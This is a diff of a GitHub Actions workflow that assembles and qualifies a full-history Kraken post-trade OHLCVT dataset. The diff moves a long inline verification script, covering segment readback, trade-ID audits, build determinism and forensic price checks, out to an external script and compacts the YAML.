-          parent_frozen = hashlib.sha256(posttrade.compact(frozen_digests)).hexdigest()
-          first = next((e for e in evidences if e.get("first_provider_trade_ts")), None)
-          last = next((e for e in reversed(evidences) if e.get("last_provider_trade_ts")), None)
-          parent_evidence = {
-              "schema_version": posttrade.SOURCE_SCHEMA,
-              "source_mode": posttrade.SOURCE_MODE,
-              "symbol": posttrade.SYMBOL,
-              "segment_id": parent_descriptor["segment_id"],
-              "requested_start_utc": parent_descriptor["requested_start_utc"],
-              "requested_end_utc": parent_descriptor["requested_end_utc"],
-              "first_provider_trade_ts": None if first is None else first["first_provider_trade_ts"],
-              "first_provider_trade_id": None if first is None else first["first_provider_trade_id"],
-              "last_provider_trade_ts": None if last is None else last["last_provider_trade_ts"],
-              "last_provider_trade_id": None if last is None else last["last_provider_trade_id"],
-              "page_count": sum(int(e["page_count"]) for e in evidences),
-              "raw_row_count": sum(int(e["raw_row_count"]) for e in evidences),
-              "unique_trade_count": sum(int(e["unique_trade_count"]) for e in evidences),
-              "duplicate_trade_id_count": sum(int(e["duplicate_trade_id_count"]) for e in evidences),
-              "trade_id_conflict_count": 0,
-              "initial_cursor": evidences[0]["initial_cursor"],
-              "final_cursor": evidences[-1]["final_cursor"],
-              "cursor_monotonic": True,
-              "frozen_source_digest": parent_frozen,
-              "raw_pages_digest": hashlib.sha256(posttrade.compact(raw_page_digests)).hexdigest(),
-              "page_transcript_digest": hashlib.sha256(posttrade.compact(transcript_digests)).hexdigest(),
-              "gap_policy": posttrade.GAP_POLICY,
-              "synthetic_fill": False,
-              "completion_status": "COMPLETE",
-              "build_a_source_digest": parent_frozen,
-              "build_b_source_digest": parent_frozen,
-              "derived_5m_digest": posttrade._digest_records(assembled_a["5m"]),
-              "derived_1d_digest": posttrade._digest_records(assembled_a["1d"]),
-              "segment_output_digest": posttrade.sha256_file(target / "segment-output.json"),
-              "persistence_model": "S2_MINIMUM_SEGMENT_OUTPUT_AND_EVIDENCE",
-              "resume_granularity": "COMPLETED_LOGICAL_SEGMENT",
-              "page_level_checkpointing": False,
-              "max_parallel": 1,
-              "execution_mode": "UTC_CALENDAR_MONTH_FALLBACK",
-              "recovery_mode": "UTC_CALENDAR_MONTH_FALLBACK",
-              "recovery_schema": os.environ["RECOVERY_SCHEMA"],
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "recovery_orchestration_sha": os.environ["GITHUB_SHA"],
-              "parent_segment_id": parent_descriptor["segment_id"],
-              "child_segment_ids": [e["segment_id"] for e in evidences],
-              "child_recovery_ids": [m["recovery_child_id"] for m in metas],
-              "children": [{
-                  "recovery_child_id": m["recovery_child_id"],
-                  "production_child_segment_id": m["production_child_segment_id"],
-                  "requested_start_utc": m["requested_start_utc"],
-                  "requested_end_utc": m["requested_end_utc"],
-                  "page_count": m["page_count"],
-                  "elapsed_seconds": m["elapsed_seconds"],
-                  "frozen_source_digest": m["frozen_source_digest"],
-              } for m in metas],
-              "coverage_proof": {"no_gap": True, "no_overlap": True, "status": "PASS"},
-              "cross_child_provider_trade_id_conflicts": 0,
-              "recovered_parent_build_a_b": "PASS",
-              "recovered_parent_assembly_determinism": "PASS",
-          }
-          (target / "evidence.json").write_bytes(posttrade.compact(parent_evidence))
-          total_elapsed = sum(Decimal(m["elapsed_seconds"]) for m in metas)
-          readback = {
-              "schema_version": "kraken-posttrade-full-segment-readback/2.0.0",
-              "execution_mode": "UTC_CALENDAR_MONTH_FALLBACK",
-              "segment_id": parent_descriptor["segment_id"],
-              "requested_start_utc": parent_descriptor["requested_start_utc"],
-              "requested_end_utc": parent_descriptor["requested_end_utc"],
-              "elapsed_seconds": str(total_elapsed),
-              "qualified_time_bound_seconds": str(posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS),
-              "qualified_page_bound": page_bound,
-              "child_execution_count": 3,
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "recovery_orchestration_sha": os.environ["GITHUB_SHA"],
-              "evidence_sha256": posttrade.sha256_file(target / "evidence.json"),
-              "segment_output_sha256": posttrade.sha256_file(target / "segment-output.json"),
-              "provider_trade_ids_sha256": posttrade.sha256_file(target / "provider-trade-ids.txt"),
-              "status": "PASS",
-          }
-          (target / "segment-readback.json").write_bytes(posttrade.compact(readback))
-          print("RECOVERED_PARENT_SEGMENT_BUILD_A_B=PASS")
-          print("RECOVERED_PARENT_SEGMENT_ASSEMBLY_DETERMINISM=PASS")
-          print("CROSS_CHILD_PROVIDER_TRADE_ID_CONFLICTS=0")
-          print("PARENT_COVERAGE_NO_GAP=PASS")
-          print("PARENT_COVERAGE_NO_OVERLAP=PASS")
-          print(f"RECOVERED_PARENT_SEGMENT_ID={parent_descriptor['segment_id']}")
-          PY
-
+        run: python "${RUNNER_TEMP}/r09.py" assemble-quarter
       - name: Persist completed logical-quarter artifact
         uses: actions/upload-artifact@v4
-        with:
-          name: ${{ matrix.artifact_name }}
-          path: ${{ runner.temp }}/logical-parent
-          retention-days: 7
-          if-no-files-found: error
-
+        with: {name: "${{ matrix.artifact_name }}", path: "${{ runner.temp }}/logical-parent", retention-days: 7, if-no-files-found: error}
   full_readback_and_candidate:
-    needs:
-      - recovery_inventory
-      - remaining_logical_segment
+    needs: [recovery_inventory, remaining_logical_segment]
     if: ${{ needs.remaining_logical_segment.result == 'success' }}
     runs-on: ubuntu-24.04
     timeout-minutes: 360
     steps:
-      - name: Checkout qualified production source authority
-        uses: actions/checkout@v6
-        with:
-          ref: 91546fdd81471851c2cb6b948821c04cfe636f1c
-          fetch-depth: 1
-
-      - name: Set up canonical Python
-        uses: actions/setup-python@v6
-        with:
-          python-version: "3.11"
-
-      - name: Download predecessor logical artifacts 000 through 021
+      - uses: actions/checkout@v6
+        with: {ref: 91546fdd81471851c2cb6b948821c04cfe636f1c, fetch-depth: 1}
+      - uses: actions/setup-python@v6
+        with: {python-version: "3.11"}
+      - name: Download R07 000..021
         uses: actions/download-artifact@v4
-        with:
-          pattern: kraken-posttrade-full-*
-          path: ${{ runner.temp }}/kraken-posttrade-global/predecessor
-          merge-multiple: false
-          github-token: ${{ github.token }}
-          repository: vitaliipython-ship-it/eth-macro-data-bridge
-          run-id: 33916820262
-
-      - name: Download successor logical artifacts 022 through 044
+        with: {pattern: kraken-posttrade-full-*, path: "${{ runner.temp }}/global/r07", merge-multiple: false, github-token: "${{ github.token }}", repository: vitaliipython-ship-it/eth-macro-data-bridge, run-id: 33916820262}
+      - name: Download R08 022
         uses: actions/download-artifact@v4
-        with:
-          pattern: kraken-posttrade-full-*
-          path: ${{ runner.temp }}/kraken-posttrade-global/successor
-          merge-multiple: false
-
-      - name: Global provider trade-ID uniqueness audit
+        with: {name: kraken-posttrade-full-022-9deb84887d89, path: "${{ runner.temp }}/global/r08/kraken-posttrade-full-022-9deb84887d89", github-token: "${{ github.token }}", repository: vitaliipython-ship-it/eth-macro-data-bridge, run-id: 33964062741}
+      - name: Download R09 023..044
+        uses: actions/download-artifact@v4
+        with: {pattern: kraken-posttrade-full-*, path: "${{ runner.temp }}/global/r09", merge-multiple: false}
+      - name: Global provider trade-ID audit
+        id: ids
         shell: bash
         run: |
           set -euo pipefail
-          ROOT="${RUNNER_TEMP}/kraken-posttrade-global"
-          IDS="${RUNNER_TEMP}/kraken-posttrade-global-provider-ids.txt"
-          find "$ROOT" -type f -name provider-trade-ids.txt -print0 | sort -z | xargs -0 cat > "$IDS"
-          DUPLICATE_ID="$(LC_ALL=C sort -S 50% "$IDS" | uniq -d | head -n 1 || true)"
-          if [[ -n "$DUPLICATE_ID" ]]; then
-            echo "POSTTRADE_PRODUCTION_TRADE_ID_CONFLICT_ACROSS_LOGICAL_SEGMENTS=$DUPLICATE_ID"
-            exit 71
-          fi
-          echo "GLOBAL_PROVIDER_TRADE_ID_AUDIT=PASS"
-          echo "GLOBAL_PROVIDER_TRADE_ID_CONFLICTS=0"
-
-      - name: Full-chain readback, Build A/B, WARM, forensic and candidate qualification
+          find "${RUNNER_TEMP}/global" -type f -name provider-trade-ids.txt -print0 | sort -z | xargs -0 cat > "${RUNNER_TEMP}/all-ids.txt"
+          d="$(LC_ALL=C sort -S 50% "${RUNNER_TEMP}/all-ids.txt" | uniq -d | head -n1 || true)"; [[ -z "$d" ]] || { echo "GLOBAL_PROVIDER_TRADE_ID_CONFLICT=$d"; exit 71; }
+          n="$(wc -l < "${RUNNER_TEMP}/all-ids.txt")"; echo "total=$n" >> "$GITHUB_OUTPUT"; echo "GLOBAL_PROVIDER_TRADE_ID_AUDIT=PASS"; echo "GLOBAL_PROVIDER_TRADE_ID_CONFLICTS=0"; echo "TOTAL_UNIQUE_PROVIDER_TRADES=$n"
+      - name: Full chain, Build A/B, WARM, forensic and candidate
         shell: bash
         env:
           FULL_START_UTC: ${{ needs.recovery_inventory.outputs.start_utc }}
           FULL_END_UTC: ${{ needs.recovery_inventory.outputs.end_utc }}
           FULL_CUTOFF_MS: ${{ needs.recovery_inventory.outputs.cutoff_ms }}
           FULL_WARM_FIRST_MS: ${{ needs.recovery_inventory.outputs.warm_first_ms }}
-          FULL_SEGMENT_COUNT: ${{ needs.recovery_inventory.outputs.segment_count }}
+          TOTAL_UNIQUE_PROVIDER_TRADES: ${{ steps.ids.outputs.total }}
         run: |
           set -euo pipefail
-          python - <<'PY'
-          import hashlib
-          import json
-          import os
-          import shutil
-          from datetime import datetime, timezone
-          from decimal import Decimal
-          from pathlib import Path
-          from tools.deep_history import kraken_spot_ohlcvt_backfill as backfill
-          from tools.deep_history import kraken_spot_posttrade as posttrade
-
-          root = Path(os.environ["RUNNER_TEMP"]) / "kraken-posttrade-global"
-          predecessor_root = root / "predecessor"
-          successor_root = root / "successor"
-          directories = sorted({p.parent for p in root.rglob("evidence.json")}, key=lambda d: json.loads((d / "evidence.json").read_text())["requested_start_utc"])
-          if len(directories) != 45:
-              raise RuntimeError(f"logical segment readback count mismatch: {len(directories)} != 45")
-          required = {"evidence.json", "provider-trade-ids.txt", "segment-output.json", "segment-readback.json"}
-          evidences = []
-          outputs = []
-          previous_end = None
-          fallback_parents = []
-          page_bound = int(os.environ["KRAKEN_POSTTRADE_QUALIFIED_QUARTER_PAGE_BOUND"])
-          for index, directory in enumerate(directories):
-              names = {p.name for p in directory.iterdir() if p.is_file()}
-              if names != required:
-                  raise RuntimeError(f"logical artifact file-set mismatch: {directory} {sorted(names)}")
-              evidence = json.loads((directory / "evidence.json").read_text())
-              readback = json.loads((directory / "segment-readback.json").read_text())
-              start = evidence["requested_start_utc"]
-              end = evidence["requested_end_utc"]
-              if evidence["segment_id"] != posttrade.segment_id(start, end):
-                  raise RuntimeError("logical segment deterministic identity mismatch")
-              if readback["segment_id"] != evidence["segment_id"]:
-                  raise RuntimeError("logical readback identity mismatch")
-              if readback["evidence_sha256"] != posttrade.sha256_file(directory / "evidence.json"):
-                  raise RuntimeError("logical evidence SHA mismatch")
-              if readback["segment_output_sha256"] != posttrade.sha256_file(directory / "segment-output.json"):
-                  raise RuntimeError("logical output SHA mismatch")
-              if readback["provider_trade_ids_sha256"] != posttrade.sha256_file(directory / "provider-trade-ids.txt"):
-                  raise RuntimeError("logical provider-ID SHA mismatch")
-              if evidence.get("completion_status") != "COMPLETE" or evidence.get("cursor_monotonic") is not True:
-                  raise RuntimeError("logical completion/cursor failed")
-              if int(evidence.get("trade_id_conflict_count", -1)) != 0:
-                  raise RuntimeError("logical provider trade-ID conflict")
-              if evidence.get("gap_policy") != "PROVIDER_NO_TRADE_OMISSION" or evidence.get("synthetic_fill") is not False:
-                  raise RuntimeError("logical gap/no-fill semantics mismatch")
-              if index < 22:
-                  if predecessor_root not in directory.parents:
-                      raise RuntimeError("predecessor lineage placement mismatch")
-                  if int(evidence["page_count"]) > page_bound:
-                      raise RuntimeError("predecessor quarter page bound exceeded")
-                  if Decimal(readback["elapsed_seconds"]) > posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS:
-                      raise RuntimeError("predecessor quarter time bound exceeded")
-              else:
-                  if successor_root not in directory.parents:
-                      raise RuntimeError("successor lineage placement mismatch")
-                  if evidence.get("source_authority_sha") != os.environ["SOURCE_AUTHORITY_SHA"]:
-                      raise RuntimeError("successor source authority drift")
-                  mode = evidence.get("execution_mode", "DIRECT_QUARTER")
-                  if mode == "DIRECT_QUARTER":
-                      if int(evidence["page_count"]) > page_bound:
-                          raise RuntimeError("successor direct quarter page bound exceeded")
-                      if Decimal(readback["elapsed_seconds"]) > posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS:
-                          raise RuntimeError("successor direct quarter time bound exceeded")
-                  elif mode == "UTC_CALENDAR_MONTH_FALLBACK":
-                      children = evidence.get("children")
-                      if not isinstance(children, list) or len(children) != 3:
-                          raise RuntimeError("recovered parent child inventory mismatch")
-                      if evidence.get("cross_child_provider_trade_id_conflicts") != 0:
-                          raise RuntimeError("recovered parent cross-child trade-ID conflict")
-                      if evidence.get("recovered_parent_build_a_b") != "PASS" or evidence.get("recovered_parent_assembly_determinism") != "PASS":
-                          raise RuntimeError("recovered parent determinism evidence failed")
-                      if evidence.get("coverage_proof") != {"no_gap": True, "no_overlap": True, "status": "PASS"}:
-                          raise RuntimeError("recovered parent coverage proof failed")
-                      if children[0]["requested_start_utc"] != start or children[-1]["requested_end_utc"] != end:
-                          raise RuntimeError("recovered parent outer coverage mismatch")
-                      for left, right in zip(children, children[1:]):
-                          if left["requested_end_utc"] != right["requested_start_utc"]:
-                              raise RuntimeError("recovered parent child seam gap/overlap")
-                      for child in children:
-                          if int(child["page_count"]) > page_bound or Decimal(child["elapsed_seconds"]) > posttrade.QUALIFIED_CONSERVATIVE_QUARTER_SECONDS:
-                              raise RuntimeError("recovered parent child hard boundary exceeded")
-                      fallback_parents.append(index)
-                  else:
-                      raise RuntimeError(f"unknown successor execution mode: {mode}")
-              if previous_end is None:
-                  if start != "2015-08-07T00:00:00.000000Z":
-                      raise RuntimeError(f"unexpected market inception segment start: {start}")
-              elif previous_end != start:
-                  raise RuntimeError(f"logical segment chain gap: {previous_end} -> {start}")
-              previous_end = end
-              evidences.append(evidence)
-              outputs.append(json.loads((directory / "segment-output.json").read_text()))
-          if previous_end != os.environ["FULL_END_UTC"]:
-              raise RuntimeError("full-chain end mismatch")
-          first = evidences[0]
-          if first["first_provider_trade_ts"] != "2015-08-07T14:03:25.775444995Z" or first["first_provider_trade_id"] != "OG6TQH-NEBSF-FBMDZJ":
-              raise RuntimeError("market inception provider identity drift")
-
-          assembled_maps = {"5m": {}, "1d": {}}
-          for output in outputs:
-              if set(output) != {"5m", "1d"}:
-                  raise RuntimeError("invalid logical segment output schema")
-              for interval in ("5m", "1d"):
-                  for row in output[interval]:
-                      ts = int(row[0])
-                      prior = assembled_maps[interval].get(ts)
-                      assembled_maps[interval][ts] = row if prior is None else posttrade._merge_record(prior, row)
-          assembled_a = {interval: [assembled_maps[interval][k] for k in sorted(assembled_maps[interval])] for interval in ("5m", "1d")}
-          assembled_maps_b = {"5m": {}, "1d": {}}
-          for output in outputs:
-              for interval in ("5m", "1d"):
-                  for row in output[interval]:
-                      ts = int(row[0])
-                      prior = assembled_maps_b[interval].get(ts)
-                      assembled_maps_b[interval][ts] = row if prior is None else posttrade._merge_record(prior, row)
-          assembled_b = {interval: [assembled_maps_b[interval][k] for k in sorted(assembled_maps_b[interval])] for interval in ("5m", "1d")}
-          if assembled_a != assembled_b:
-              raise RuntimeError("full logical segment assembly nondeterminism")
-          if not assembled_a["5m"] or not assembled_a["1d"]:
-              raise RuntimeError("full assembled output is empty")
-          full_5m_sha = hashlib.sha256(posttrade.compact(assembled_a["5m"])).hexdigest()
-          full_1d_sha = hashlib.sha256(posttrade.compact(assembled_a["1d"])).hexdigest()
-          warm = backfill.verify_warm_overlap_records(assembled_a, Path("."))
-          if warm["conflicts"] != 0:
-              raise RuntimeError("PostTrade/WARM overlap conflict")
-
-          def window(interval, start, end):
-              start_ms = int(datetime.fromisoformat(start.replace("Z", "+00:00")).timestamp() * 1000)
-              end_ms = int(datetime.fromisoformat(end.replace("Z", "+00:00")).timestamp() * 1000)
-              rows = [row for row in assembled_a[interval] if start_ms <= int(row[0]) < end_ms]
-              if not rows:
-                  raise RuntimeError(f"forensic window empty: {interval} {start} {end}")
-              return rows
-
-          forensic = {}
-          rows = window("1d", "2015-10-01T00:00:00Z", "2015-11-01T00:00:00Z")
-          low = min(rows, key=lambda row: Decimal(str(row[3])))
-          if not (Decimal("0.30") <= Decimal(str(low[3])) <= Decimal("0.60")):
-              raise RuntimeError("2015 forensic low outside acceptance band")
-          forensic["2015_0_41_region"] = {"low_row": low}
-          rows = window("1d", "2016-06-01T00:00:00Z", "2016-07-01T00:00:00Z")
-          high = max(rows, key=lambda row: Decimal(str(row[2])))
-          if not (Decimal("20") <= Decimal(str(high[2])) <= Decimal("23")):
-              raise RuntimeError("2016 forensic high outside acceptance band")
-          forensic["2016_21_48_high_region"] = {"high_row": high}
-          rows = window("1d", "2016-11-15T00:00:00Z", "2016-12-15T00:00:00Z")
-          low = min(rows, key=lambda row: Decimal(str(row[3])))
-          if not (Decimal("5") <= Decimal(str(low[3])) <= Decimal("7")):
-              raise RuntimeError("2016 forensic low outside acceptance band")
-          forensic["2016_5_92_low_region"] = {"low_row": low}
-          rows = window("1d", "2017-06-01T00:00:00Z", "2017-08-01T00:00:00Z")
-          high = max(rows, key=lambda row: Decimal(str(row[2])))
-          low = min(rows, key=lambda row: Decimal(str(row[3])))
-          if not (Decimal("350") <= Decimal(str(high[2])) <= Decimal("450")) or not (Decimal("100") <= Decimal(str(low[3])) <= Decimal("180")) or int(high[0]) >= int(low[0]):
-              raise RuntimeError("2017 forensic acceptance failed")
-          forensic["2017_404_98_to_134_78_ordering"] = {"high_row": high, "low_row": low}
-
-          candidate_root = Path(os.environ["RUNNER_TEMP"]) / "kraken-posttrade-full-candidate"
-          if candidate_root.exists(): shutil.rmtree(candidate_root)
-          build_a = candidate_root / "build-a"
-          build_b = candidate_root / "build-b"
-          archive = candidate_root / "kraken-posttrade-derived-ohlcvt.zip"
-          derived = posttrade.write_derived_archive(assembled_a, archive)
-          lineage = backfill._source_lineage([{"evidence": evidence} for evidence in evidences])
-          source = {
-              "schema_version": posttrade.SOURCE_SCHEMA,
-              "source_mode": posttrade.SOURCE_MODE,
-              "authority": "KRAKEN_OFFICIAL_POSTTRADE",
-              "endpoint": posttrade.ENDPOINT,
-              "documentation": posttrade.DOCUMENTATION,
-              "symbol": posttrade.SYMBOL,
-              "logical_segmentation": "UTC_CALENDAR_QUARTER",
-              "boundary_recovery_execution": "DETERMINISTIC_UTC_CALENDAR_MONTH",
-              "resume_granularity": "COMPLETED_LOGICAL_SEGMENT",
-              "page_level_checkpointing": False,
-              "max_parallel": 1,
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "source_authority_tree": os.environ["SOURCE_AUTHORITY_TREE"],
-              "predecessor_run_id": 33916820262,
-              "successor_run_id": int(os.environ["GITHUB_RUN_ID"]),
-              "recovery_orchestration_sha": os.environ["GITHUB_SHA"],
-              "backfill_cutoff_ms": int(os.environ["FULL_CUTOFF_MS"]),
-              "canonical_warm_first_ms": int(os.environ["FULL_WARM_FIRST_MS"]),
-              "coverage_declared_start_utc": posttrade.MARKET_INCEPTION_UTC,
-              "coverage_declared_end_utc": os.environ["FULL_END_UTC"],
-              "archive_sha256": lineage["frozen_source_digest"],
-              "source_lineage_digest": lineage["source_lineage_digest"],
-              "segment_count": lineage["segment_count"],
-              "first_provider_trade_ts": lineage["first_provider_trade_ts"],
-              "first_provider_trade_id": lineage["first_provider_trade_id"],
-              "last_provider_trade_ts": lineage["last_provider_trade_ts"],
-              "last_provider_trade_id": lineage["last_provider_trade_id"],
-              "page_count": lineage["page_count"],
-              "raw_row_count": lineage["raw_row_count"],
-              "unique_trade_count": lineage["unique_trade_count"],
-              "duplicate_trade_id_count": lineage["duplicate_trade_id_count"],
-              "derived_archive_sha256": derived["derived_archive_sha256"],
-              "derived_archive_size_bytes": derived["derived_archive_size_bytes"],
-              "derived_row_counts": derived["row_counts"],
-              "gap_policy": posttrade.GAP_POLICY,
-              "synthetic_fill": False,
-              "acquired_at_utc": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
-          }
-          (candidate_root / "source.json").parent.mkdir(parents=True, exist_ok=True)
-          (candidate_root / "source.json").write_bytes(backfill.compact(source))
-          assets_a = backfill.build_assets(archive, build_a, int(os.environ["FULL_CUTOFF_MS"]), source)
-          assets_b = backfill.build_assets(archive, build_b, int(os.environ["FULL_CUTOFF_MS"]), source)
-          backfill.compare_builds(assets_a, assets_b)
-          warm_assets = backfill.verify_warm_overlap(assets_a)
-          if warm_assets != warm:
-              raise RuntimeError("assembled-output and Build-A WARM mismatch")
-          build_a_digest = hashlib.sha256(backfill.compact({a["asset_name"]: a["sha256"] for a in assets_a})).hexdigest()
-          build_b_digest = hashlib.sha256(backfill.compact({a["asset_name"]: a["sha256"] for a in assets_b})).hexdigest()
-          if build_a_digest != build_b_digest:
-              raise RuntimeError("global Build A/B digest mismatch")
-
-          inventory = {
-              "schema_version": "kraken-posttrade-full-candidate-inventory/2.0.0",
-              "source_mode": posttrade.SOURCE_MODE,
-              "symbol": posttrade.SYMBOL,
-              "requested_start_utc": os.environ["FULL_START_UTC"],
-              "requested_end_utc": os.environ["FULL_END_UTC"],
-              "logical_segment_count": 45,
-              "predecessor_execution_lineage": {"run_id": 33916820262, "logical_segments": "000..021"},
-              "successor_execution_lineage": {"run_id": int(os.environ["GITHUB_RUN_ID"]), "logical_segments": "022..044", "recovery_orchestration_sha": os.environ["GITHUB_SHA"]},
-              "source_authority_sha": os.environ["SOURCE_AUTHORITY_SHA"],
-              "source_authority_tree": os.environ["SOURCE_AUTHORITY_TREE"],
-              "boundary_fallback_parent_indices": fallback_parents,
-              "segments": [{
-                  "index": i,
-                  "segment_id": evidence["segment_id"],
-                  "requested_start_utc": evidence["requested_start_utc"],
-                  "requested_end_utc": evidence["requested_end_utc"],
-                  "execution_mode": evidence.get("execution_mode", "DIRECT_QUARTER_PREDECESSOR"),
-                  "page_count": evidence["page_count"],
-                  "raw_row_count": evidence["raw_row_count"],
-                  "unique_trade_count": evidence["unique_trade_count"],
-                  "duplicate_trade_id_count": evidence["duplicate_trade_id_count"],
-                  "first_provider_trade_ts": evidence["first_provider_trade_ts"],
-                  "first_provider_trade_id": evidence["first_provider_trade_id"],
-                  "last_provider_trade_ts": evidence["last_provider_trade_ts"],
-                  "last_provider_trade_id": evidence["last_provider_trade_id"],
-                  "frozen_source_digest": evidence["frozen_source_digest"],
-                  "segment_output_digest": evidence["segment_output_digest"],
-                  "page_transcript_digest": evidence["page_transcript_digest"],
-                  "completion_status": evidence["completion_status"],
-              } for i, evidence in enumerate(evidences)],
-              "full_outputs": {
-                  "5m": {"first_timestamp": assembled_a["5m"][0][0], "last_timestamp": assembled_a["5m"][-1][0], "row_count": len(assembled_a["5m"]), "sha256": full_5m_sha},
-                  "1d": {"first_timestamp": assembled_a["1d"][0][0], "last_timestamp": assembled_a["1d"][-1][0], "row_count": len(assembled_a["1d"]), "sha256": full_1d_sha},
-              },
-              "global_build_a_digest": build_a_digest,
-              "global_build_b_digest": build_b_digest,
-              "assets": [{k: v for k, v in asset.items() if k != "local_path"} for asset in assets_a],
-              "source_lineage_digest": source["source_lineage_digest"],
-              "frozen_source_digest": source["archive_sha256"],
-              "derived_archive_sha256": source["derived_archive_sha256"],
-              "warm_overlap": warm,
-              "forensic_acceptance": forensic,
-              "gap_policy": posttrade.GAP_POLICY,
-              "synthetic_fill": False,
-              "second_consumer_route_created": False,
-              "second_source_authority_created": False,
-              "second_storage_authority_created": False,
-              "research_mutation": False,
-              "release_publication": "NOT_RUN",
-              "control_plane_install": "NOT_RUN",
-              "capability_activation": "NO",
-              "owner_merge": "NO",
-          }
-          inventory_path = candidate_root / "candidate-inventory.json"
-          inventory_path.write_bytes(backfill.compact(inventory))
-          candidate_sha = backfill.sha256_file(inventory_path)
-          qualification = {
-              "schema_version": "kraken-posttrade-full-qualification/2.0.0",
-              "status": "PASS",
-              "full_candidate_sha256": candidate_sha,
-              "candidate_inventory_sha256": candidate_sha,
-              "logical_segment_count": 45,
-              "segments_000_to_044_complete_persisted": "PASS",
-              "segment_22_recovery": "PASS" if 22 in fallback_parents else "FAIL",
-              "all_boundary_fallback_parents": "PASS",
-              "full_segment_readback": "PASS",
-              "full_segment_chain_contiguity": "PASS",
-              "global_provider_trade_id_audit": "PASS",
-              "global_provider_trade_id_conflicts": 0,
-              "global_cursor_pagination_continuity": "PASS",
-              "frozen_source_lineage": "PASS",
-              "full_5m_build_a_b": "PASS",
-              "full_1d_build_a_b": "PASS",
-              "full_segment_assembly_determinism": "PASS",
-              "warm_overlap": warm,
-              "forensic_2015_2017_acceptance": "PASS",
-              "no_synthetic_fill": "PASS",
-              "full_candidate_inventory": "PASS",
-              "second_consumer_route_created": "NO",
-              "second_source_authority_created": "NO",
-              "second_storage_authority_created": "NO",
-              "research_mutation": "NO",
-              "release_publication": "NOT_RUN",
-              "control_plane_install": "NOT_RUN",
-              "history_kraken_spot_v2": "NOT_ACTIVE",
-              "owner_merge": "NO",
-              "terminal_state": "KRAKEN_POSTTRADE_FULL_MARKET_INCEPTION_TO_WARM_ACQUISITION_AND_FULL_CHAIN_QUALIFICATION_PASSED_OWNER_RELEASE_ACTIVATION_GATE_READY",
-              "next_exact_gate": "OWNER_DECISION_ON_HISTORY_KRAKEN_SPOT_V2_RELEASE_PUBLICATION_AND_CONTROL_PLANE_ACTIVATION",
-          }
-          (candidate_root / "qualification-summary.json").write_bytes(backfill.compact(qualification))
-          shutil.rmtree(build_b)
-          checksums = []
-          for path in sorted(candidate_root.rglob("*")):
-              if path.is_file():
-                  checksums.append(f"{backfill.sha256_file(path)}  {path.relative_to(candidate_root).as_posix()}")
-          (candidate_root / "SHA256SUMS").write_text("\n".join(checksums) + "\n", encoding="utf-8")
-          print("LOGICAL_SEGMENT_COUNT=45")
-          print("SEGMENTS_000_TO_044_COMPLETE_PERSISTED=PASS")
-          print("SEGMENT_22_RECOVERY=PASS")
-          print(f"BOUNDARY_FALLBACK_PARENT_INDICES={fallback_parents}")
-          print("FULL_SEGMENT_READBACK=PASS")
-          print("FULL_SEGMENT_CHAIN_CONTIGUITY=PASS")
-          print("GLOBAL_PROVIDER_TRADE_ID_AUDIT=PASS")
-          print("GLOBAL_PROVIDER_TRADE_ID_CONFLICTS=0")
-          print("GLOBAL_CURSOR_PAGINATION_CONTINUITY=PASS")
-          print("FROZEN_SOURCE_LINEAGE=PASS")
-          print(f"FIRST_PROVIDER_TRADE_TS={source['first_provider_trade_ts']}")
-          print(f"FIRST_PROVIDER_TRADE_ID={source['first_provider_trade_id']}")
-          print(f"LAST_PROVIDER_TRADE_TS={source['last_provider_trade_ts']}")
-          print(f"LAST_PROVIDER_TRADE_ID={source['last_provider_trade_id']}")
-          print(f"TOTAL_UNIQUE_PROVIDER_TRADES={source['unique_trade_count']}")
-          print(f"5M_FIRST_TIMESTAMP={assembled_a['5m'][0][0]}")
-          print(f"5M_LAST_TIMESTAMP={assembled_a['5m'][-1][0]}")
-          print(f"5M_ROW_COUNT={len(assembled_a['5m'])}")
-          print(f"5M_SHA256={full_5m_sha}")
-          print(f"1D_FIRST_TIMESTAMP={assembled_a['1d'][0][0]}")
-          print(f"1D_LAST_TIMESTAMP={assembled_a['1d'][-1][0]}")
-          print(f"1D_ROW_COUNT={len(assembled_a['1d'])}")
-          print(f"1D_SHA256={full_1d_sha}")
-          print(f"GLOBAL_BUILD_A_DIGEST={build_a_digest}")
-          print(f"GLOBAL_BUILD_B_DIGEST={build_b_digest}")
-          print("FULL_5M_BUILD_A_B=PASS")
-          print("FULL_1D_BUILD_A_B=PASS")
-          print("FULL_SEGMENT_ASSEMBLY_DETERMINISM=PASS")
-          print(f"WARM_OVERLAP_COUNTS={warm['overlaps']}")
-          print(f"WARM_OVERLAP_CONFLICTS={warm['conflicts']}")
-          print("FORENSIC_2015_2017_ACCEPTANCE=PASS")
-          print("NO_SYNTHETIC_FILL=PASS")
-          print("FULL_CANDIDATE_INVENTORY=PASS")
-          print(f"FULL_CANDIDATE_SHA256={candidate_sha}")
-          print("SECOND_CONSUMER_ROUTE_CREATED=NO")
-          print("SECOND_SOURCE_AUTHORITY_CREATED=NO")
-          print("SECOND_STORAGE_AUTHORITY_CREATED=NO")
-          print("RESEARCH_MUTATION=NO")
-          print("RELEASE_PUBLICATION=NOT_RUN")
-          print("CONTROL_PLANE_INSTALL=NOT_RUN")
-          print("history-kraken-spot-v2=NOT_ACTIVE")
-          print("OWNER_MERGE=NO")
-          print("TERMINAL_STATE=KRAKEN_POSTTRADE_FULL_MARKET_INCEPTION_TO_WARM_ACQUISITION_AND_FULL_CHAIN_QUALIFICATION_PASSED_OWNER_RELEASE_ACTIVATION_GATE_READY")
-          print("NEXT_EXACT_GATE=OWNER_DECISION_ON_HISTORY_KRAKEN_SPOT_V2_RELEASE_PUBLICATION_AND_CONTROL_PLANE_ACTIVATION")
-          PY
-
-      - name: Upload qualification-only full candidate evidence
-        uses: actions/upload-artifact@v4
-        with:
-          name: kraken-posttrade-full-candidate-qualification
-          path: ${{ runner.temp }}/kraken-posttrade-full-candidate
-          retention-days: 7
-          if-no-files-found: error
